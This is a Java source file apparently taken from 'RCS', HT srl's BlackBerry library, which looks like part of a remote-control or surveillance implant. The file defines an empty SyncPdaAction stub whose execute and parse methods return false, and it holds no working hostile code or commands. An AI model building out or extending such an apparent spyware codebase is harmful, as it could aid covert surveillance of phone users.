//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : SyncPdaAction.java
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.action;

import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.event.Event;


/**
 * The Class SyncPdaAction.
 */
public final class SyncPdaAction extends SubAction {
    //#ifdef DEBUG
    static Debug debug = new Debug("SyncPdaAction", DebugLevel.VERBOSE);

    //#endif

    /**
     * Instantiates a new sync pda action.
     * 
     * @param actionId_
     *            the action id_
     * @param confParams
     *            the conf params
     */
    public SyncPdaAction(final int actionId_, final byte[] confParams) {
        super(actionId_);
        parse(confParams);
    }

    /*
     * (non-Javadoc)
     * @see blackberry.action.SubAction#execute(blackberry.event.Event)
     */
    public boolean execute(final Event triggeringEvent) {
        
        return false;
    }

    /*
     * (non-Javadoc)
     * @see blackberry.action.SubAction#parse(byte[])
     */
    protected boolean parse(final byte[] confParams) {
        
        return false;
    }

    public String toString() {
        return "SyncPDA";
    }
}
